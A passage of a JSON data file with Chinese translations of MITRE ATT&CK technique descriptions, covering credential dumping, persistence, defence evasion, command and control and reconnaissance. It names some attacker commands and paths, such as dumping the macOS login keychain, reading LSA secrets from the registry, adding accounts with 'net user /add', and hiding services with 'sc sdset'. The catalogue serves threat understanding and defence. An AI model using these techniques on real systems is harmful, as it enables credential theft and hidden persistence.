–d</code>将从<code>~/Library/Keychains/login.keychain-db</code>转储所有登录钥匙串凭据。对手还可能直接从<code>~/Library/Keychains/login.keychain</code>文件读取登录钥匙串凭据。这两种方法都需要密码，其中登录钥匙串的默认密码是当前用户登录macOS主机的密码。(引用: External to DA, the OS X Way)(引用: Empire Keychain Decrypt)"
    },
    "Boot or Logon Autostart Execution": {
        "translated_name": "启动或登录自动启动执行",
        "translated_description": "对手可能会配置系统设置，以在系统启动或登录时自动执行程序，以保持持久性或在受感染系统上获得更高的权限。操作系统可能有机制在系统启动或账户登录时自动运行程序。(引用: Microsoft Run Key)(引用: MSDN Authentication Packages)(引用: Microsoft TimeProvider)(引用: Cylance Reg Persistence Sept 2013)(引用: Linux Kernel Programming) 这些机制可能包括自动执行放置在特别指定目录中的程序，或由存储配置信息的存储库引用的程序，例如Windows注册表。对手可能通过修改或扩展内核功能来实现相同的目标。\n\n由于某些启动或登录自动启动程序以更高的权限运行，对手可能会利用这些来提升权限。"
    },
    "LSA Secrets": {
        "translated_name": "LSA秘密",
        "translated_description": "具有SYSTEM访问权限的对手可能会尝试访问本地安全机构（LSA）秘密，其中可能包含各种不同的凭据材料，例如服务账户的凭据。(引用: Passcape LSA Secrets)(引用: Microsoft AD Admin Tier Model)(引用: Tilbury Windows Credentials) LSA秘密存储在注册表中的<code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>。LSA秘密也可以从内存中转储。(引用: ired Dumping LSA Secrets)\n\n可以使用[Reg](https://attack.mitre.org/software/S0075)从注册表中提取。可以使用[Mimikatz](https://attack.mitre.org/software/S0002)从内存中提取秘密。(引用: ired Dumping LSA Secrets)"
    },
    "Weaken Encryption": {
        "translated_name": "削弱加密",
        "translated_description": "对手可能会破坏网络设备的加密能力，以绕过原本保护数据通信的加密。(引用: Cisco Synful Knock Evolution)\n\n加密可以用来保护传输的网络流量，以保持其机密性（防止未经授权的披露）和完整性（防止未经授权的更改）。加密密码用于将明文消息转换为密文，并且在没有相关解密密钥的情况下解密通常需要大量计算。通常，较长的密钥会增加密码分析的成本，或在没有密钥的情况下解密。\n\n对手可以破坏和操纵执行网络流量加密的设备。例如，通过行为如[修改系统映像](https://attack.mitre.org/techniques/T1601)、[减少密钥空间](https://attack.mitre.org/techniques/T1600/001)和[禁用加密硬件](https://attack.mitre.org/techniques/T1600/002)，对手可以负面影响和/或消除设备安全加密网络流量的能力。这增加了未经授权披露的风险，并可能有助于数据操纵、凭据访问或收集工作。(引用: Cisco Blog Legacy Device Attacks)"
    },
    "SAML Tokens": {
        "translated_name": "SAML令牌",
        "translated_description": "如果对手拥有有效的SAML令牌签名证书，他们可能会伪造具有任何权限声明和生命周期的SAML令牌。(引用: Microsoft SolarWinds Steps) SAML令牌的默认生命周期为一小时，但可以在令牌的<code>conditions ...</code>元素中的<code>NotOnOrAfter</code>值中指定有效期。可以使用<code>LifetimeTokenPolicy</code>中的<code>AccessTokenLifetime</code>更改此值。(引用: Microsoft SAML Token Lifetimes) 伪造的SAML令牌使对手能够在使用SAML 2.0作为单点登录（SSO）机制的服务之间进行身份验证。(引用: Cyberark Golden SAML)\n\n对手可能会利用[私钥](https://attack.mitre.org/techniques/T1552/004)来破坏组织的令牌签名证书，以创建伪造的SAML令牌。如果对手有足够的权限与他们自己的Active Directory联合服务（AD FS）服务器建立新的联合信任，他们可能会生成自己的受信任令牌签名证书。(引用: Microsoft SolarWinds Customer Guidance) 这与[窃取应用程序访问令牌](https://attack.mitre.org/techniques/T1528)和其他类似行为不同，因为这些令牌是由对手新伪造的，而不是从合法用户那里窃取或拦截的。\n\n如果伪造的SAML令牌声称代表一个高度特权的账户，对手可能会获得管理Entra ID的权限。这可能导致[使用替代身份验证材料](https://attack.mitre.org/techniques/T1550)，从而绕过多因素和其他身份验证保护机制。(引用: Microsoft SolarWinds Customer Guidance)"
    },
    "Masquerade File Type": {
        "translated_name": "伪装文件类型",
        "translated_description": "对手可能会通过更改有效负载的格式，包括文件的签名、扩展名和内容，将恶意负载伪装为合法文件。各种文件类型都有一个典型的标准格式，包括它们的编码和组织方式。例如，文件的签名（也称为头或魔术字节）是文件的开始字节，通常用于识别文件的类型。例如，JPEG文件的头是<code>0xFF 0xD8</code>，文件扩展名是`.JPE`、`.JPEG`或`.JPG`。\n\n对手可能会编辑头的十六进制代码和/或恶意负载的文件扩展名，以绕过文件验证检查和/或输入清理。这种行为通常在传输（例如，[工具传输](https://attack.mitre.org/techniques/T1105)）和存储（例如，[上传恶意软件](https://attack.mitre.org/techniques/T1608/001)）负载文件时使用，以便对手可以移动他们的恶意软件而不会触发检测。\n\n常见的非可执行文件类型和扩展名，例如文本文件（`.txt`）和图像文件（`.jpg`、`.gif`等）通常被视为无害。基于此，对手可能会使用文件扩展名来伪装恶意软件，例如将PHP后门代码命名为<code>test.gif</code>。用户可能不知道文件是恶意的，因为它看起来无害且文件扩展名无害。\n\n多态文件，即具有多种不同文件类型并根据将执行它们的应用程序而不同功能的文件，也可能用于伪装恶意软件和功能。(引用: polygot_icedID)"
    },
    "Service Stop": {
        "translated_name": "服务停止",
        "translated_description": "对手可能会停止或禁用系统上的服务，使这些服务对合法用户不可用。停止关键服务或进程可能会抑制或停止对事件的响应，或帮助对手实现其总体目标，对环境造成损害。(引用: Talos Olympic Destroyer 2018)(引用: Novetta Blockbuster)\n\n对手可能通过禁用对组织至关重要的单个服务来实现这一点，例如<code>MSExchangeIS</code>，这将使Exchange内容不可访问。(引用: Novetta Blockbuster) 在某些情况下，对手可能会停止或禁用许多或所有服务，使系统无法使用。(引用: Talos Olympic Destroyer 2018) 服务或进程可能不允许在运行时修改其数据存储。对手可能会停止服务或进程，以便对服务的数据存储进行[数据破坏](https://attack.mitre.org/techniques/T1485)或[影响加密数据](https://attack.mitre.org/techniques/T1486)。(引用: SecureWorks WannaCry Analysis)"
    },
    "Malware": {
        "translated_name": "恶意软件",
        "translated_description": "对手可能会购买、窃取或下载在目标过程中使用的恶意软件。恶意软件可以包括有效负载、投放器、后期妥协工具、后门、打包器和C2协议。对手可能会获取恶意软件以支持其操作，获得控制远程机器、规避防御和执行后期妥协行为的手段。\n\n除了从互联网下载免费恶意软件外，对手还可能从第三方实体购买这些能力。第三方实体可以包括专门从事恶意软件开发的技术公司、犯罪市场（包括恶意软件即服务，或MaaS），或个人。除了购买恶意软件外，对手还可能从第三方实体（包括其他对手）窃取和重新利用恶意软件。"
    },
    "Device Driver Discovery": {
        "translated_name": "设备驱动程序发现",
        "translated_description": "对手可能会尝试枚举受害者主机上的本地设备驱动程序。有关设备驱动程序的信息可能会揭示各种洞察，塑造后续行为，例如主机的功能/用途、存在的安全工具（即[安全软件发现](https://attack.mitre.org/techniques/T1518/001)）或其他防御（例如，[虚拟化/沙箱规避](https://attack.mitre.org/techniques/T1497)），以及潜在的可利用漏洞（例如，[特权提升利用](https://attack.mitre.org/techniques/T1068)）。\n\n许多操作系统实用程序可能提供有关本地设备驱动程序的信息，例如Windows上的`driverquery.exe`和`EnumDeviceDrivers()` API函数。(引用: Microsoft Driverquery)(引用: Microsoft EnumDeviceDrivers) 有关设备驱动程序的信息（以及相关服务，即[系统服务发现](https://attack.mitre.org/techniques/T1007)）也可能在注册表中可用。(引用: Microsoft Registry Drivers)\n\n在Linux/macOS上，设备驱动程序（以内核模块的形式）可能在`/dev`中可见，或使用`lsmod`和`modinfo`等实用程序。(引用: Linux Kernel Programming)(引用: lsmod man)(引用: modinfo man)"
    },
    "Domain Account": {
        "translated_name": "域账户",
        "translated_description": "对手可能会创建域账户以保持对受害者系统的访问。域账户是由Active Directory域服务管理的账户，访问和权限配置在属于该域的系统和服务之间。域账户可以涵盖用户、管理员和服务账户。具有足够访问权限的情况下，可以使用<code>net user /add /domain</code>命令创建域账户。(引用: Savill 1999)\n\n这些账户可以用于建立不需要在系统上部署持久远程访问工具的次要凭证访问。"
    },
    "Active Setup": {
        "translated_name": "活动设置",
        "translated_description": "对手可能通过向本地计算机的活动设置添加注册表项来实现持久性。活动设置是一个Windows机制，用于在用户登录时执行程序。存储在注册表项中的值将在用户登录计算机后执行。(引用: Klein Active Setup 2010) 这些程序将在用户的上下文中执行，并具有账户的相关权限级别。\n\n对手可能通过在<code> HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code>下创建一个键并为<code>StubPath</code>设置恶意值来滥用活动设置。此值将作为用户登录计算机时执行的程序。(引用: Mandiant Glyer APT 2010)(引用: Citizenlab Packrat 2015)(引用: FireEye CFR Watering Hole 2012)(引用: SECURELIST Bright Star 2015)(引用: paloalto Tropic Trooper 2016)\n\n对手可以滥用这些组件来执行恶意软件，例如远程访问工具，以通过系统重启保持持久性。对手还可能使用[伪装](https://attack.mitre.org/techniques/T1036)使注册表项看起来像是与合法程序相关联。"
    },
    "Hide Artifacts": {
        "translated_name": "隐藏工件",
        "translated_description": "对手可能会尝试隐藏与其行为相关的工件以逃避检测。操作系统可能具有隐藏各种工件的功能，例如重要的系统文件和管理任务执行，以避免干扰用户工作环境并防止用户更改系统上的文件或功能。对手可能会滥用这些功能来隐藏工件，例如文件、目录、用户账户或其他系统活动，以逃避检测。(引用: Sofacy Komplex Trojan)(引用: Cybereason OSX Pirrit)(引用: MalwareBytes ADS July 2015)\n\n对手还可能尝试通过创建与常见安全仪器隔离的计算区域（例如通过使用虚拟化技术）来隐藏与恶意行为相关的工件。(引用: Sophos Ragnar May 2020)"
    },
    "Dynamic Data Exchange": {
        "translated_name": "动态数据交换",
        "translated_description": "对手可能会使用Windows动态数据交换（DDE）来执行任意命令。DDE是一种客户端-服务器协议，用于应用程序之间的一次性和/或连续的进程间通信（IPC）。一旦建立链接，应用程序可以自主交换由字符串、热数据链接（数据项更改时的通知）、热数据链接（数据项更改的复制）和命令执行请求组成的事务。\n\n对象链接和嵌入（OLE），或在文档之间链接数据的能力，最初是通过DDE实现的。尽管被[组件对象模型](https://attack.mitre.org/techniques/T1559/001)取代，但DDE可能在Windows 10和大多数Microsoft Office 2016中通过注册表项启用。(引用: BleepingComputer DDE Disabled in Word Dec 2017)(引用: Microsoft ADV170021 Dec 2017)(引用: Microsoft DDE Advisory Nov 2017)\n\nMicrosoft Office文档可以通过DDE命令中毒，直接或通过嵌入文件，并用于通过[网络钓鱼](https://attack.mitre.org/techniques/T1566)活动或托管的Web内容进行执行，避免使用Visual Basic for Applications（VBA）宏。(引用: SensePost PS DDE May 2016)(引用: Kettle CSV DDE Aug 2014)(引用: Enigma Reviving DDE Jan 2018)(引用: SensePost MacroLess DDE Oct 2017) 类似地，对手可能会感染有效负载，通过在CSV文件中嵌入DDE公式来执行应用程序和/或命令，意图通过Windows电子表格程序打开。(引用: OWASP CSV Injection)(引用: CSV Excel Macro Injection )\n\nDDE还可以被在受感染机器上操作的对手利用，而无需直接访问[命令和脚本解释器](https://attack.mitre.org/techniques/T1059)。DDE执行可以通过[远程服务](https://attack.mitre.org/techniques/T1021)（如[分布式组件对象模型](https://attack.mitre.org/techniques/T1021/003)（DCOM））远程调用。(引用: Fireeye Hunting COM June 2019)"
    },
    "Malicious File": {
        "translated_name": "恶意文件",
        "translated_description": "对手可能依赖用户打开恶意文件以获得执行。用户可能会受到社会工程的影响，诱使他们打开一个将导致代码执行的文件。此用户操作通常会作为[鱼叉式网络钓鱼附件](https://attack.mitre.org/techniques/T1566/001)的后续行为观察到。对手可能会使用多种类型的文件，这些文件需要用户执行，包括.doc、.pdf、.xls、.rtf、.scr、.exe、.lnk、.pif、.cpl和.reg。\n\n对手可能会采用各种形式的[伪装](https://attack.mitre.org/techniques/T1036)和[混淆文件或信息](https://attack.mitre.org/techniques/T1027)来增加用户打开并成功执行恶意文件的可能性。这些方法可能包括使用熟悉的命名约定和/或密码保护文件，并向用户提供如何打开文件的说明。(引用: Password Protected Word Docs) \n\n虽然[恶意文件](https://attack.mitre.org/techniques/T1204/002)通常在初始访问后不久发生，但它也可能在入侵的其他阶段发生，例如当对手将文件放置在共享目录或用户桌面上，希望用户点击它。此活动也可能在[内部鱼叉式网络钓鱼](https://attack.mitre.org/techniques/T1534)后不久看到。"
    },
    "Identify Business Tempo": {
        "translated_name": "识别业务节奏",
        "translated_description": "对手可能会收集有关受害者业务节奏的信息，以在目标过程中使用。有关组织业务节奏的信息可能包括各种详细信息，包括运营时间/每周的工作日。这些信息还可能揭示受害者硬件和软件资源的购买和发货时间/日期。\n\n对手可能会通过多种方式收集这些信息，例如通过[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)进行直接引诱。有关业务节奏的信息也可能通过在线或其他可访问的数据集（例如，[社交媒体](https://attack.mitre.org/techniques/T1593/001)或[搜索受害者拥有的网站](https://attack.mitre.org/techniques/T1594)）暴露给对手。(引用: ThreatPost Broadvoice Leak) 收集这些信息可能会揭示其他形式的侦察机会（例如，[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)或[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)），建立操作资源（例如，[建立账户](https://attack.mitre.org/techniques/T1585)或[妥协账户](https://attack.mitre.org/techniques/T1586)），和/或初始访问（例如，[供应链妥协](https://attack.mitre.org/techniques/T1195)或[受信任关系](https://attack.mitre.org/techniques/T1199)）"
    },
    "Publish/Subscribe Protocols": {
        "translated_name": "发布/订阅协议",
        "translated_description": "对手可能会使用发布/订阅（pub/sub）应用层协议进行通信，以通过与现有流量混合来避免检测/网络过滤。发送到远程系统的命令以及这些命令的结果通常会嵌入在客户端和服务器之间的协议流量中。\n\n诸如<code>MQTT</code>、<code>XMPP</code>、<code>AMQP</code>和<code>STOMP</code>等协议使用发布/订阅设计，消息分发由集中式代理管理。(引用: wailing crab sub/pub)(引用: Mandiant APT1 Appendix) 发布者按主题分类其消息，而订阅者根据其订阅的主题接收消息。(引用: wailing crab sub/pub) 对手可能会滥用发布/订阅协议，通过消息代理与其控制的系统进行通信，同时模仿正常、预期的流量。"
    },
    "Hardware": {
        "translated_name": "硬件",
        "translated_description": "对手可能会收集有关受害者主机硬件的信息，以在目标过程中使用。有关硬件基础设施的信息可能包括各种详细信息，例如特定主机上的类型和版本，以及可能表明增加了防御保护的附加组件的存在（例如：卡/生物识别读卡器、专用加密硬件等）。\n\n对手可能通过多种方式收集这些信息，例如通过[主动扫描](https://attack.mitre.org/techniques/T1595)（例如：主机名、服务器横幅、用户代理字符串）或[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)进行直接收集操作。对手还可能会入侵网站，然后在其中包含旨在从访问者那里收集主机信息的恶意内容。(引用: ATT ScanBox) 有关硬件基础设施的信息也可能通过在线或其他可访问的数据集（例如：工作招聘、网络图、评估报告、简历或采购发票）暴露给对手。收集这些信息可能会揭示其他形式的侦察机会（例如：[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)或[搜索开放技术数据库](https://attack.mitre.org/techniques/T1596)），建立操作资源（例如：[开发能力](https://attack.mitre.org/techniques/T1587)或[获取能力](https://attack.mitre.org/techniques/T1588)），和/或初始访问（例如：[硬件供应链妥协](https://attack.mitre.org/techniques/T1195/003)或[硬件添加](https://attack.mitre.org/techniques/T1200)）。"
    },
    "Taint Shared Content": {
        "translated_name": "污染共享内容",
        "translated_description": "对手可能通过向共享存储位置（如网络驱动器或内部代码库）添加内容来将有效负载传递到远程系统。存储在网络驱动器或其他共享位置的内容可能会通过向有效文件添加恶意程序、脚本或漏洞利用代码而被污染。一旦用户打开共享的污染内容，恶意部分可以执行以在远程系统上运行对手的代码。对手可能会使用污染的共享内容进行横向移动。\n\n目录共享枢纽是此技术的一种变体，它使用几种其他技术在用户访问共享网络目录时传播恶意软件。它使用目录 .LNK 文件的[快捷方式修改](https://attack.mitre.org/techniques/T1547/009)，这些文件使用[伪装](https://attack.mitre.org/techniques/T1036)看起来像真实目录，通过[隐藏文件和目录](https://attack.mitre.org/techniques/T1564/001)隐藏真实目录。恶意的基于 .LNK 的目录具有嵌入的命令，该命令在目录中执行隐藏的恶意软件文件，然后打开真实的预期目录，以便用户的预期操作仍然发生。当与经常使用的网络目录一起使用时，该技术可能导致频繁的重新感染和广泛访问系统以及可能的新和更高权限的帐户。(引用: Retwin Directory Share Pivot)\n\n对手还可能通过二进制感染来破坏共享网络目录，通过将其代码附加或前置到共享网络目录上的健康二进制文件中。恶意软件可能会修改健康二进制文件的原始入口点（OEP），以确保在合法代码之前执行。感染可能会通过新感染的文件在远程系统执行时继续传播。这些感染可能针对以 .EXE、.DLL、.SCR、.BAT 和/或 .VBS 等扩展名结尾的二进制和非二进制格式。"
    },
    "Trust Modification": {
        "translated_name": "信任修改",
        "translated_description": "对手可能会添加新的域信任，修改现有域信任的属性，或以其他方式更改域和租户之间的信任关系配置，以规避防御和/或提升权限。信任详细信息，例如用户身份是否联合，允许身份验证和授权属性在域或租户之间应用，以访问共享资源。(引用: Microsoft - Azure AD Federation) 这些信任对象可能包括应用于服务器、令牌和域的帐户、凭据和其他身份验证材料。\n\n操纵这些信任可能允许对手通过修改设置以添加他们控制的对象来提升权限和/或规避防御。例如，在 Microsoft Active Directory (AD) 环境中，这可以用来伪造[SAML 令牌](https://attack.mitre.org/techniques/T1606/002)，而无需破坏签名证书来伪造新凭据。相反，对手可以操纵域信任以添加自己的签名证书。对手还可以使用 Active Directory 联合服务 (AD FS) 将 AD 域转换为联合域，这可能使恶意信任修改成为可能，例如更改声明发布规则，以指定用户身份登录任何有效的凭据集。(引用: AADInternals zure AD Federated Domain)\n\n对手还可以向身份租户（如 Okta 或 AWS IAM 身份中心）添加新的联合身份提供者，这可能使对手能够以租户的任何用户身份进行身份验证。(引用: Okta Cross-Tenant Impersonation 2023) 这可能使威胁行为者能够广泛访问利用身份租户的各种基于云的服务。例如，在 AWS 环境中，创建新身份提供者的对手将能够联合到所有 AWS 组织成员帐户，而无需为每个成员帐户创建身份。(引用: AWS RE:Inforce Threat Detection 2024)"
    },
    "Symmetric Cryptography": {
        "translated_name": "对称加密",
        "translated_description": "对手可能会使用已知的对称加密算法来隐藏命令和控制流量，而不是依赖于通信协议提供的任何固有保护。对称加密算法使用相同的密钥进行明文加密和密文解密。常见的对称加密算法包括 AES、DES、3DES、Blowfish 和 RC4。"
    },
    "Local Account": {
        "translated_name": "本地账户",
        "translated_description": "对手可能会创建本地账户以保持对受害者系统的访问。本地账户是由组织配置供用户、远程支持、服务或单个系统或服务的管理使用的账户。\n\n例如，具有足够访问权限的情况下，可以使用 Windows <code>net user /add</code> 命令创建本地账户。在 macOS 系统上，可以使用 <code>dscl -create</code> 命令创建本地账户。本地账户也可以添加到网络设备，通常通过常见的[网络设备 CLI](https://attack.mitre.org/techniques/T1059/008)命令如 <code>username</code>，或使用 `kubectl` 实用程序添加到 Kubernetes 集群。(引用: cisco_username_cmd)(引用: Kubernetes Service Accounts Security)\n\n这些账户可以用于建立不需要在系统上部署持久远程访问工具的次要凭证访问。"
    },
    "Social Media Accounts": {
        "translated_name": "社交媒体账户",
        "translated_description": "对手可能会创建和培养社交媒体账户，以在目标过程中使用。对手可以创建社交媒体账户，用于建立一个虚拟身份以进一步操作。虚拟身份开发包括公共信息、存在、历史和适当的关联的开发。(引用: NEWSCASTER2014)(引用: BlackHatRobinSage)\n\n对于包含社会工程的操作，利用社交媒体上的虚拟身份可能很重要。这些虚拟身份可能是虚构的或冒充真实的人。虚拟身份可能存在于单个社交媒体网站上或跨多个网站（例如：Facebook、LinkedIn、Twitter 等）。在社交媒体上建立虚拟身份可能需要开发额外的文档，使其看起来真实。这可能包括填写个人资料信息、发展社交网络或包含照片。\n\n一旦开发了虚拟身份，对手可以使用它来创建与感兴趣目标的连接。这些连接可能是直接的，也可能包括尝试通过其他人进行连接。(引用: NEWSCASTER2014)(引用: BlackHatRobinSage) 这些账户可能在对手生命周期的其他阶段被利用，例如在初始访问期间（例如：[通过服务进行鱼叉式网络钓鱼](https://attack.mitre.org/techniques/T1566/003)）。"
    },
    "Safe Mode Boot": {
        "translated_name": "安全模式启动",
        "translated_description": "对手可能会滥用 Windows 安全模式来禁用端点防御。安全模式以有限的驱动程序和服务启动 Windows 操作系统。第三方安全软件（如端点检测和响应 (EDR) 工具）可能在安全模式下启动 Windows 后不会启动。安全模式有两个版本：安全模式和带网络的安全模式。可以在安全模式启动后启动其他服务。(引用: Microsoft Safe Mode)(引用: Sophos Snatch Ransomware 2019)\n\n对手可能会滥用安全模式来禁用在有限启动时可能不会启动的端点防御。可以通过修改引导配置数据 (BCD) 存储来强制主机在下次重启后进入安全模式，这些存储是管理引导应用程序设置的文件。(引用: Microsoft bcdedit 2021)\n\n对手还可能通过修改相关注册表值（即[修改注册表](https://attack.mitre.org/techniques/T1112)）将其恶意应用程序添加到安全模式下启动的最小服务列表中。恶意[组件对象模型](https://attack.mitre.org/techniques/T1559/001) (COM) 对象也可能在安全模式下注册和加载。(引用: Sophos Snatch Ransomware 2019)(引用: CyberArk Labs Safe Mode 2016)(引用: Cybereason Nocturnus MedusaLocker 2020)(引用: BleepingComputer REvil 2021)"
    },
    "TFTP Boot": {
        "translated_name": "TFTP 启动",
        "translated_description": "对手可能会滥用网络启动从简单文件传输协议 (TFTP) 服务器加载未经授权的网络设备操作系统。TFTP 启动（网络启动）通常由网络管理员用于从集中管理服务器加载配置控制的网络设备映像。网络启动是引导顺序中的一个选项，可用于集中管理和控制设备映像。\n\n对手可能会操纵网络设备上的配置，指定使用恶意 TFTP 服务器，这可能与[修改系统映像](https://attack.mitre.org/techniques/T1601)结合使用，以在设备启动或重置时加载修改后的映像。未经授权的映像允许对手修改设备配置，向设备添加恶意功能，并引入后门以保持对网络设备的控制，同时通过使用标准功能最小化检测。这种技术类似于[ROMMONkit](https://attack.mitre.org/techniques/T1542/004)，可能导致网络设备运行修改后的映像。(引用: Cisco Blog Legacy Device Attacks)"
    },
    "Windows Service": {
        "translated_name": "Windows 服务",
        "translated_description": "对手可能会创建或修改 Windows 服务，以便在持久性的一部分中重复执行恶意有效负载。当 Windows 启动时，它会启动称为服务的程序或应用程序，这些程序或应用程序执行后台系统功能。(引用: TechNet Services) Windows 服务配置信息，包括服务可执行文件或恢复程序/命令的文件路径，存储在 Windows 注册表中。\n\n对手可能会安装新服务或修改现有服务，以便在启动时执行以在系统上保持持久性。可以使用系统实用程序（如 sc.exe）设置或修改服务配置，通过直接修改注册表，或通过直接与 Windows API 交互。\n\n对手还可能使用服务安装和执行恶意驱动程序。例如，在将驱动程序文件（例如 .sys）放到磁盘后，可以通过[本机 API](https://attack.mitre.org/techniques/T1106)函数（如 `CreateServiceW()`）加载和注册有效负载（或通过函数如 `ZwLoadDriver()` 和 `ZwSetValueKey()` 手动），通过创建所需的服务注册表值（即[修改注册表](https://attack.mitre.org/techniques/T1112)），或通过使用命令行实用程序如 `PnPUtil.exe`。(引用: Symantec W.32 Stuxnet Dossier)(引用: Crowdstrike DriveSlayer February 2022)(引用: Unit42 AcidBox June 2020) 对手可能利用这些驱动程序作为[Rootkit](https://attack.mitre.org/techniques/T1014)来隐藏系统上的恶意活动。对手还可能将签名但易受攻击的驱动程序加载到受感染的机器上（称为“自带易受攻击的驱动程序” (BYOVD)），作为[特权提升利用](https://attack.mitre.org/techniques/T1068)的一部分。(引用: ESET InvisiMole June 2020)(引用: Unit42 AcidBox June 2020)\n\n服务可能以管理员权限创建，但以 SYSTEM 权限执行，因此对手也可能使用服务来提升权限。对手还可能通过[服务执行](https://attack.mitre.org/techniques/T1569/002)直接启动服务。\n\n为了使检测分析更加困难，恶意服务还可能包含[伪装任务或服务](https://attack.mitre.org/techniques/T1036/004)（例如，使用与合法操作系统或良性软件组件相关的服务和/或有效负载名称）。对手还可能创建“隐藏”服务（即，[隐藏工件](https://attack.mitre.org/techniques/T1564)），例如通过使用 `sc sdset` 命令通过服务描述符定义语言 (SDDL) 设置服务权限。这可能会隐藏 Windows 服务，使其无法通过标准服务枚举方法（如 `Get-Service`、`sc query` 和 `services.exe`）查看。(引用: SANS 1)(引用: SANS 2)"
    },
    "Fast Flux DNS": {
        "translated_name": "快速变换DNS",
        "translated_description": "对手可能会使用快速变换DNS来隐藏命令和控制通道，背后是一个与单个域解析相关的快速变化的IP地址数组。此技术使用完全限定域名，分配给它的多个IP地址以高频率交换，使用循环IP地址分配和短时间生存（TTL）的DNS资源记录的组合。(引用: MehtaFastFluxPt1)(引用: MehtaFastFluxPt2)(引用: Fast Flux - Welivesecurity)\n\n最简单的“单一变换”方法涉及将地址注册和注销为单个DNS名称的DNS A（地址）记录列表的一部分。这些注册的平均寿命为五分钟，导致IP地址解析的不断洗牌。(引用: Fast Flux - Welivesecurity)\n\n相比之下，“双重变换”方法将地址注册和注销为DNS区域的DNS名称服务器记录列表的一部分，为连接提供额外的弹性。通过双重变换，额外的主机可以充当C2主机的代理，进一步隔离C2通道的真实来源。"
    },
    "System Checks": {
        "translated_name": "系统检查",
        "translated_description": "对手可能会进行各种系统检查，以检测和避免虚拟化和分析环境。这可能包括根据检查虚拟机环境（VME）或沙箱指示的工件的结果更改行为。如果对手检测到VME，他们可能会更改其恶意软件以脱离受害者或隐藏植入物的核心功能。他们还可能在投放二级或额外有效负载之前搜索VME工件。对手可能会利用从[虚拟化/沙箱规避](https://attack.mitre.org/techniques/T1497)中学到的信息，在自动发现期间塑造后续行为。(引用: Deloitte Environment Awareness)\n\n具体检查将根据目标和/或对手而有所不同，但可能涉及使用[Windows管理规范](https://attack.mitre.org/techniques/T1047)、[PowerShell](https://attack.mitre.org/techniques/T1059/001)、[系统信息发现](https://attack.mitre.org/techniques/T1082)和[查询注册表](https://attack.mitre.org/techniques/T1012)等行为来获取系统信息并搜索VME工件。对手可能会在内存、进程、文件系统、硬件和/或注册表中搜索VME工件。对手可能会使用脚本将这些检查自动化到一个脚本中，然后如果确定系统是虚拟环境，则让程序退出。\n\n检查可能包括通用系统属性，例如主机/域名和网络流量样本。对手还可能检查网络适配器地址、CPU核心数和可用内存/驱动器大小。一旦执行，恶意软件还可能使用[文件和目录发现](https://attack.mitre.org/techniques/T1083)来检查它是否保存在具有意外或甚至与分析相关的命名工件（例如`malware`、`sample`或`hash`）的文件夹或文件中。\n\n其他常见检查可能枚举这些应用程序独有的运行服务、系统上安装的程序、虚拟机应用程序的制造商/产品字段字符串以及VME特定的硬件/处理器指令。(引用: McAfee Virtual Jan 2017) 在VMWare等应用程序中，对手还可以使用特殊的I/O端口发送命令并接收输出。\n\n硬件检查，例如风扇、温度和音频设备的存在，也可以用来收集可能表明虚拟环境的证据。对手还可能查询这些设备的特定读数。(引用: Unit 42 OilRig Sept 2018)"
    },
    "Cron": {
        "translated_name": "Cron",
        "translated_description": "对手可能会滥用<code>cron</code>实用程序来执行任务调度，以初始或定期执行恶意代码。(引用: 20 macOS Common Tools and Techniques) <code>cron</code>实用程序是类Unix操作系统的基于时间的作业调度程序。<code>crontab</code>文件包含要运行的cron条目和指定的执行时间。任何<code>crontab</code>文件都存储在特定于操作系统的文件路径中。\n\n对手可能会在Linux或Unix环境中使用<code>cron</code>在系统启动时或定期执行程序以实现[持久性](https://attack.mitre.org/tactics/TA0003)。"
    },
    "Domain Groups": {
        "translated_name": "域组",
        "translated_description": "对手可能会尝试查找域级别的组和权限设置。域级别权限组的知识可以帮助对手确定哪些组存在以及哪些用户属于特定组。对手可能会使用此信息来确定哪些用户具有提升的权限，例如域管理员。\n\n命令如<code>net group /domain</code>的[Net](https://attack.mitre.org/software/S0039)实用程序、macOS上的<code>dscacheutil -q group</code>和Linux上的<code>ldapsearch</code>可以列出域级别的组。"
    },
    "Vulnerabilities": {
        "translated_name": "漏洞",
        "translated_description": "对手可能会获取可在目标过程中使用的漏洞信息。漏洞是计算机硬件或软件中的弱点，可能被对手利用以导致意外或未预期的行为发生。对手可能通过搜索开放数据库或访问封闭漏洞数据库来查找漏洞信息。(引用: National Vulnerability Database)\n\n对手可能会监控漏洞披露/数据库，以了解现有和新发现的漏洞状态。通常在发现漏洞和公开之间存在延迟。对手可能会针对已知进行漏洞研究的系统（包括商业供应商）。了解漏洞可能会导致对手搜索现有漏洞利用（即[漏洞利用](https://attack.mitre.org/techniques/T1588/005)）或尝试自己开发一个（即[漏洞利用](https://attack.mitre.org/techniques/T1587/004)）。"
    },
    "Spearphishing Link": {
        "translated_name": "鱼叉式网络钓鱼链接",
        "translated_description": "对手可能会发送带有恶意链接的鱼叉式网络钓鱼消息，以获取可在目标过程中使用的敏感信息。鱼叉式网络钓鱼信息试图欺骗目标泄露信息，通常是凭据或其他可操作的信息。鱼叉式网络钓鱼信息通常涉及社会工程技术，例如冒充有理由收集信息的来源（例如：[建立账户](https://attack.mitre.org/techniques/T1585)或[妥协账户](https://attack.mitre.org/techniques/T1586)）和/或发送多个看似紧急的消息。\n\n所有形式的鱼叉式网络钓鱼都是针对特定个人、公司或行业的电子社交工程。在这种情况下，恶意电子邮件包含链接，通常伴有社会工程文本，以诱使用户主动点击或复制并粘贴URL到浏览器中。(引用: TrendMictro Phishing)(引用: PCMag FakeLogin) 给定的网站可能是合法网站的克隆（例如在线或公司登录门户）或在外观上非常类似于合法网站，并且URL包含来自真实网站的元素。URL还可能通过利用URL模式中的怪癖来混淆，例如接受基于整数或十六进制的主机名格式，并自动丢弃“@”符号之前的文本：例如，`hxxp://google.com@1157586937`。(引用: Mandiant URL Obfuscation 2023)\n\n对手还可能在网络钓鱼消息中嵌入“跟踪像素”、“网络错误”或“网络信标”，以验证电子邮件的接收，同时可能分析和跟踪受害者信息，例如IP地址。(引用: NIST Web Bug)(引用: Ryte Wiki) 这些机制通常显示为小图像（通常为一个像素大小）或其他方式混淆的对象，通常作为包含指向远程服务器的链接的HTML代码传递。(引用: Ryte Wiki)(引用: 